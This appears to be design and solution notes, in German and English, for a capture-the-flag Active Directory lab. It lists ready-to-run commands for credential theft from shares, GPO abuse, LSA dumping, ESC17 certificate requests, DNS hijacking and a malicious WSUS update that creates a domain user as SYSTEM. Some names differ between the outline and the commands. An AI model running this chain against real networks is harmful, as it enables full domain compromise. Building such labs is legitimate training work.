## Attack chain idea
### Step-by-step
1. `DeploymentShare$` auf `SRV02` als Guest lesen und `hack.lu\svc_mdt` aus `Control\Bootstrap.ini` holen ([NetExec WDS/MDT](https://github.com/Pennyw0rth/NetExec/pull/1194)).
2. Mit `svc_mdt` die GPO für `SRV02` ändern und dort Local Admin werden.
3. `SRV02$` verwenden, um über das WebServer-Template der CA auf `DC01` ein TLS-Zertifikat für den nur in AD existierenden `wsus.hack.lu` anzufordern (ESC17).
4. Den DNS-Eintrag `wsus.hack.lu` durch ein unauthentifiziertes Update der Zone mit nonsecure updates auf die Angreifer-IP ändern.
5. Mit `wsuks --serve-only` und dem Zertifikat HTTPS-WSUS-Updates an `DC01` liefern. `DC01` fragt jede Minute nach Updates; die Payload läuft als SYSTEM ([ESC17/WSUS](https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/)).

## Aufbau (Windows Server 2022)
1. Auf `DC01`: `.\Domain_Controller.ps1 -Stage Promote` ausführen. Nach einem Neustart denselben Stage erneut starten, bis die Domain-Promotion abgeschlossen ist; dann als Domain-Administrator anmelden.
2. Auf `DC01`: `$deploymentPassword = Read-Host 'svc_mdt password' -AsSecureString`; danach `.\Domain_Controller.ps1 -Stage Configure -DeploymentPassword $deploymentPassword` ausführen.
3. Auf `SRV02`: `.\Server.ps1 -Stage Join -DcAddress <DC01-IP>` ausführen. Nach einem Neustart denselben Stage erneut starten, bis der Domain-Join abgeschlossen ist; dann als Domain-Administrator anmelden.
4. Auf `SRV02`: `$deploymentPassword = Read-Host 'svc_mdt password' -AsSecureString`; danach `.\Server.ps1 -Stage Configure -DeploymentPassword $deploymentPassword` ausführen. In beiden Schritten dasselbe Passwort eingeben.

### Commands
1. `nxc smb 192.168.108.20 -u guest -p '' --share REMINST --get-file 'WdsClientUnattend\ImageUnattend.xml' ImageUnattend.xml`
2. `nxc smb 192.168.108.20 -u svc_deploy -p 'D3pl0y!_AgileCorp'`
3. `pipx inject netexec ldap3-bleeding-edge`
4. `nxc ldap 192.168.108.10 -u svc_deploy -p 'D3pl0y!_AgileCorp' --bloodhound -c all --dns-server 192.168.108.10`
5. `pygpoabuse 'agile-corp.hacklu/svc_deploy:D3pl0y!_AgileCorp' -gpo-id "5889E490-F649-4B0C-AF73-5220803E133C" -dc-ip 192.168.108.10 -vv -command 'net localgroup "Administrators" "agile-corp.hacklu\svc_deploy" /add'`
7. `nxc smb 192.168.108.20 -u svc_deploy -p 'D3pl0y!_AgileCorp' --lsa`
8. `nxc ldap 192.168.108.10 -u svc_deploy -p 'D3pl0y!_AgileCorp' -M certipy-find`
9. Update WSUS DNS entry (first update hosts file): `nsupdate`
   1. `nsupdate`
   2. `server agile-corp.hacklu`
   3. `zone agile-corp.hacklu`
   4. `update add wsus.agile-corp.hacklu. 86400 A 192.168.108.137`
   5. `update delete wsus.agile-corp.hacklu. A 172.16.10.10`
   6. `send`
10. `certipy req -dc-ip 192.168.108.10 -u SRV$ -hashes c05529a83e9df1e168d860edcb7cfa79 -template WebServer -target DC.agile-corp.hacklu -ca agile-corp-Root-CA -dns wsus.agile-corp.hacklu`
11. `openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:`
12. `sudo wsuks --WSUS-Server 192.168.108.10 --tls-cert wsus.pem --serve-only`
13. Wait up to 5 minutes for WSUS updates on the DC.


#### Manual invocations
WSUKS command:
```Powershell
PsExec64.exe /accepteula /s powershell.exe "New-ADUser -Name user89834 -AccountPassword $(ConvertTo-SecureString mlOwZvWq9sb31! -AsPlainText -Force) -Enabled $true"
```


```Powershell
ipconfig /flushdns
Import-Module PSWindowsUpdate
Install-WindowsUpdate -AcceptAll -Install
```